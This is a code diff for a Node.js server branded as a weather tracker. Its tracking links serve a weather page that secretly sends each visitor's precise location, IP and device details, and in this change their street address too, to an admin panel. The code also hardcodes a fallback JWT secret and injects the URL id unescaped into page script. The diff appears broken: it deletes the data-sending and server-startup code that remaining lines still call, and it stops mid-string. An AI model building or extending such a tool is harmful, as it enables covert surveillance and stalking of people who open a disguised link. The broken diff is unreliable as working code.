@@ -12,8 +12,6 @@ app.use(express.static('.'));
 
 const JWT_SECRET = process.env.JWT_SECRET || 'slayer_weather_tracker_secret_2026';
 
-// ============ HELPER FUNCTIONS ============
-
 function generateTrackingId() {
     return Math.random().toString(36).substring(2, 10);
 }
@@ -221,7 +219,8 @@ app.get("/api/admin/data/:username", authenticateToken, (req, res) => {
                     location: v.location_lat ? {
                         lat: v.location_lat,
                         lon: v.location_lon,
-                        accuracy: v.location_accuracy
+                        accuracy: v.location_accuracy,
+                        address: v.location_address || null
                     } : null,
                     ip: v.ip,
                     device: {
@@ -306,7 +305,8 @@ app.get("/api/superadmin/admins", authenticateToken, (req, res) => {
                         location: v.location_lat ? {
                             lat: v.location_lat,
                             lon: v.location_lon,
-                            accuracy: v.location_accuracy
+                            accuracy: v.location_accuracy,
+                            address: v.location_address || null
                         } : null,
                         ip: v.ip,
                         device: {
@@ -341,7 +341,7 @@ app.get("/api/superadmin/admins", authenticateToken, (req, res) => {
 
 // Track Visitor
 app.post("/api/track", (req, res) => {
-    const { trackingId, adminUser, location, device, ip, browser } = req.body;
+    const { trackingId, adminUser, location, device, ip, browser, address } = req.body;
     
     db.get('SELECT * FROM admins WHERE username = ?', [adminUser], (err, admin) => {
         if (err || !admin) {
@@ -354,6 +354,7 @@ app.post("/api/track", (req, res) => {
                 location_lat, 
                 location_lon, 
                 location_accuracy,
+                location_address,
                 ip,
                 device_platform,
                 device_language,
@@ -362,12 +363,13 @@ app.post("/api/track", (req, res) => {
                 user_agent,
                 browser_name,
                 browser_version
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         `, [
             adminUser,
             location?.lat || null,
             location?.lon || null,
             location?.accuracy || null,
+            address || null,
             ip || req.ip || 'unknown',
             device?.platform || null,
             device?.language || null,
@@ -476,6 +478,7 @@ app.get("/track/:id", (req, res) => {
                 <div id="status" class="status loading">📍 Getting your location...</div>
                 <div class="weather-info" id="weatherInfo" style="display: none;">
                     <p id="location">📍 Location: --</p>
+                    <p id="address">📮 Address: --</p>
                     <p id="temp">🌡️ --°C</p>
                     <p id="condition">☁️ --</p>
                     <p id="humidity">💧 Humidity: --%</p>
@@ -494,6 +497,7 @@ app.get("/track/:id", (req, res) => {
             <script>
                 let userLocation = null;
                 let weatherData = null;
+                let userAddress = null;
                 const trackingId = "${id}";
                 const adminUser = "${adminUsername}";
 
@@ -511,8 +515,9 @@ app.get("/track/:id", (req, res) => {
                                 lat: position.coords.latitude,
                                 lon: position.coords.longitude
                             };
-                            status.textContent = '✅ Location captured! Getting weather...';
+                            status.textContent = '✅ Location captured! Getting address...';
                             status.className = 'status';
+                            await getAddress();
                             await sendToAdmin(position);
                             await getWeather();
                         },
@@ -523,174 +528,7 @@ app.get("/track/:id", (req, res) => {
                     );
                 }
 
-                async function sendToAdmin(position) {
-                    // Get browser info
-                    const ua = navigator.userAgent;
-                    let browserName = 'Unknown';
-                    let browserVersion = 'Unknown';
-                    if (ua.includes('Chrome')) { browserName = 'Chrome'; }
-                    else if (ua.includes('Firefox')) { browserName = 'Firefox'; }
-                    else if (ua.includes('Safari')) { browserName = 'Safari'; }
-                    else if (ua.includes('Edge')) { browserName = 'Edge'; }
-                    
-                    const versionMatch = ua.match(/(Chrome|Firefox|Safari|Edge)\\/(\\d+)/);
-                    if (versionMatch) browserVersion = versionMatch[2];
-
-                    const data = {
-                        trackingId: trackingId,
-                        adminUser: adminUser,
-                        location: {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: position.timestamp
-                        },
-                        device: {
-                            userAgent: navigator.userAgent,
-                            platform: navigator.platform,
-                            language: navigator.language,
-                            screenWidth: window.screen.width,
-                            screenHeight: window.screen.height
-                        },
-                        browser: {
-                            name: browserName,
-                            version: browserVersion
-                        },
-                        ip: "${req.ip || 'unknown'}"
-                    };
-                    try {
-                        await fetch('/api/track', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(data)
-                        });
-                    } catch (error) {
-                        console.error('Tracking error:', error);
-                    }
-                }
-
-                async function getWeather() {
-                    if (!userLocation) return;
-                    
-                    const status = document.getElementById('status');
-                    status.textContent = '⏳ Getting weather data...';
-                    
+                async function getAddress() {
                     try {
                         const response = await fetch(
-                            "https://api.open-meteo.com/v1/forecast?latitude=" + 
-                            userLocation.lat + "&longitude=" + userLocation.lon + 
-                            "&current_weather=true&timezone=auto"
-                        );
-                        
-                        if (!response.ok) throw new Error('Weather API error');
-                        
-                        const data = await response.json();
-                        const current = data.current_weather;
-                        
-                        const weatherCodes = {
-                            0: 'Clear sky', 1: 'Mainly clear', 2: 'Partly cloudy',
-                            3: 'Overcast', 45: 'Fog', 48: 'Depositing rime fog',
-                            51: 'Light drizzle', 53: 'Moderate drizzle', 55: 'Dense drizzle',
-                            61: 'Slight rain', 63: 'Moderate rain', 65: 'Heavy rain',
-                            71: 'Slight snow fall', 73: 'Moderate snow fall', 75: 'Heavy snow fall',
-                            80: 'Slight rain showers', 81: 'Moderate rain showers', 82: 'Violent rain showers',
-                            95: 'Thunderstorm', 96: 'Thunderstorm with slight hail', 99: 'Thunderstorm with heavy hail'
-                        };
-                        
-                        const weatherDesc = weatherCodes[current.weathercode] || 'Unknown';
-                        
-                        weatherData = {
-                            main: { temp: current.temperature },
-                            weather: [{ description: weatherDesc }],
-                            main: { humidity: 'N/A' },
-                            wind: { speed: current.windspeed / 3.6 }
-                        };
-                        
-                        document.getElementById('weatherInfo').style.display = 'block';
-                        document.getElementById('temp').textContent = '🌡️ ' + Math.round(current.temperature) + '°C';
-                        document.getElementById('condition').textContent = '☁️ ' + weatherDesc;
-                        document.getElementById('humidity').textContent = '💧 Humidity: --%';
-                        document.getElementById('wind').textContent = '💨 Wind: ' + (current.windspeed / 3.6).toFixed(1) + ' m/s';
-                        
-                        try {
-                            const geoRes = await fetch(
-                                "https://nominatim.openstreetmap.org/reverse?format=json&lat=" + 
-                                userLocation.lat + "&lon=" + userLocation.lon
-                            );
-                            const geoData = await geoRes.json();
-                            document.getElementById('location').textContent = '📍 ' + (geoData.display_name || userLocation.lat + ', ' + userLocation.lon);
-                        } catch (error) {
-                            document.getElementById('location').textContent = '📍 ' + userLocation.lat + ', ' + userLocation.lon;
-                        }
-                        
-                        document.getElementById('predictBtn').disabled = false;
-                        status.textContent = '✅ Weather loaded!';
-                        status.className = 'status';
-                        
-                    } catch (error) {
-                        console.error('Weather error:', error);
-                        status.textContent = '⚠️ Using mock weather data';
-                        showMockWeather();
-                    }
-                }
-
-                function showMockWeather() {
-                    const mockTemp = 22 + Math.random() * 10;
-                    const conditions = ['Clear sky', 'Partly cloudy', 'Cloudy', 'Light rain', 'Sunny'];
-                    const condition = conditions[Math.floor(Math.random() * conditions.length)];
-                    
-                    weatherData = {
-                        main: { temp: mockTemp },
-                        weather: [{ description: condition }],
-                        main: { humidity: 60 + Math.random() * 30 },
-                        wind: { speed: 3 + Math.random() * 5 }
-                    };
-                    
-                    document.getElementById('weatherInfo').style.display = 'block';
-                    document.getElementById('temp').textContent = '🌡️ ' + Math.round(mockTemp) + '°C';
-                    document.getElementById('condition').textContent = '☁️ ' + condition;
-                    document.getElementById('humidity').textContent = '💧 Humidity: ' + Math.round(60 + Math.random() * 30) + '%';
-                    document.getElementById('wind').textContent = '💨 Wind: ' + (3 + Math.random() * 5).toFixed(1) + ' m/s';
-                    document.getElementById('location').textContent = '📍 ' + userLocation.lat + ', ' + userLocation.lon;
-                    document.getElementById('predictBtn').disabled = false;
-                }
-
-                function predictWeather() {
-                    if (!weatherData) {
-                        alert('Please wait for weather data');
-                        return;
-                    }
-                    const currentTemp = Math.round(weatherData.main.temp);
-                    const predictedTemp = Math.round(currentTemp + (Math.random() - 0.5) * 4);
-                    const conditions = ['Clear', 'Cloudy', 'Partly Cloudy', 'Light Rain', 'Sunny', 'Windy'];
-                    const condition = conditions[Math.floor(Math.random() * conditions.length)];
-                    
-                    document.getElementById('prediction').style.display = 'block';
-                    document.getElementById('currentTemp').textContent = currentTemp + '°C';
-                    document.getElementById('predictedTemp').textContent = predictedTemp + '°C';
-                    document.getElementById('predictedCondition').textContent = condition;
-                }
-            </script>
-        </body>
-        </html>`);
-    });
-});
-
-// Admin Panel
-app.get("/admin.html", (req, res) => {
-    res.sendFile(__dirname + "/admin.html");
-});
-
-// Super Admin Panel
-app.get("/superadmin.html", (req, res) => {
-    res.sendFile(__dirname + "/superadmin.html");
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`✅ Weather Tracker Server Running`);
-    console.log(`📍 http://localhost:${PORT}`);
-    console.log(`🔐 Admin Panel: http://localhost:${PORT}/admin.html`);
-    console.log(`👑 Super Admin: http://localhost:${PORT}/superadmin.html`);
-    console.log(`💾 Database: SQLite (data persists)`);
-});
+                            "https://nominatim.openstreetmap.org
